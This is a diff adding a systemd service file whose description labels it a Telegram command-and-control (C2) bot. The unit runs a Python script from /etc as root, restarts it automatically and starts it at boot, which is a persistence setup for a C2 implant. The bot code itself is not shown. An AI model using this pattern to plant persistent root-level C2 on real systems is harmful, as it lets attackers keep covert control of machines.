@@ -1,0 +1,14 @@
+[Unit]
+Description=Tom Bot Telegram C2
+After=network.target
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/etc/Tom_bot
+ExecStart=/usr/bin/python3 /etc/Tom_bot/Tom_bot.py
+Restart=always
+RestartSec=3
+
+[Install]
+WantedBy=multi-user.target
